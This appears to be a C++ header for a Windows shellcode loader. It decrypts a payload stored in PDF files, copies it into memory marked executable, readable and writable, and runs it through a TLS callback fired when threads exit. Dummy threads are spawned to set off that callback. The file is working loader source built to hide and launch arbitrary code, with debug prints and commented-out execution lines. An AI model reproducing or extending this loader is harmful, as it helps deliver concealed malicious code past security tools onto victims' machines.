#ifndef TLSCALLBACKLOAD_LIBRARY_H
#define TLSCALLBACKLOAD_LIBRARY_H

#include <mutex>
#include <string>
#include <iostream>

#include <fstream>
#include <string>
#include <cstring>
#include <iostream>
#include <thread>
#include "windows.h"
#include <vector>
#include <algorithm>

using namespace std;

static LPVOID TLSCallbackLoadMemory;

static VOID NTAPI TLSCallbackLoadTlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved) {
//    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), "22222222!\n", 14, nullptr, nullptr);
    if (dwReason == DLL_THREAD_DETACH) {
        if (TLSCallbackLoadMemory != nullptr) {
            ((void (*)()) TLSCallbackLoadMemory)();
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), "33333333!\n", 4, nullptr, nullptr);
        } else {
            WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), "44444444!\n", 4, nullptr, nullptr);
        }

//        ((void (*)()) TLSCallbackLoadMemory)();
    }
}

#ifdef _WIN64
#pragma comment(linker, "/INCLUDE:_tls_used")
#else
#pragma comment(linker,"/INCLUDE:__tls_used")
#endif // _WIN64


//extern "C"
//#ifdef _WIN64
//#pragma const_seg(".CRT$XLX")
//const
//#else
//#pragma data_seg(".CRT$XLX")
//#endif
//
//static PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = {TLSCallbackLoadTlsCallBack, 0};
//#pragma data_seg()


class MasterEncoderForTLSCallbackLoad {
public:
    static MasterEncoderForTLSCallbackLoad *getInstance();

    MasterEncoderForTLSCallbackLoad();

    ~MasterEncoderForTLSCallbackLoad();

    void setSignAndKey(char *sign, int signLen, unsigned char key);

    void decode(unsigned char *data, long size);

    void encode(unsigned char *data, long size);

    void writePDF(const string &filePath, unsigned char *data, long size);

    unsigned char *readPDF(const string &filepath, long &size);

public:
    void encodePDF(const string &pdfPath, const string &savePath);

    void decodePDF(const string &pdfPath, const string &savePath);

    unsigned char *decode(const string &pdfPath, long &size);

public:
    static void print_hello() {
        cout << "Hello World!" << endl;
    }

    static void function1(const unsigned char *decryptedData, const size_t &byteLength) {

        TLSCallbackLoadMemory = VirtualAlloc(nullptr, byteLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (TLSCallbackLoadMemory == nullptr) {
            cout << "VirtualAlloc failed!" << endl;
            return;
        }
        memcpy(TLSCallbackLoadMemory, decryptedData, byteLength);
//        ((void(*)()) TLSCallbackLoadMemory)();
        // 使用print_hello 创建一个线程
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) print_hello, nullptr, 0, nullptr);
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) print_hello, nullptr, 0, nullptr);
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) print_hello, nullptr, 0, nullptr);
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) print_hello, nullptr, 0, nullptr);
        Sleep(1000);
        if (TLSCallbackLoadMemory != nullptr) {
//            ((void (*)()) TLSCallbackLoadMemory)();
            cout << "TLSCallbackLoadMemory" << endl;
        }
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) print_hello, nullptr, 0, nullptr);

    }

    static void generateAndSortArray();

private:
    static MasterEncoderForTLSCallbackLoad *_instance;
    static mutex _mtx;

    unsigned char _codeKey;
    char *_sign;
    int _signLen;

    unsigned char *decodePDF(const string &pdfPath, long &size);
};


#endif //TLSCALLBACKLOAD_LIBRARY_H
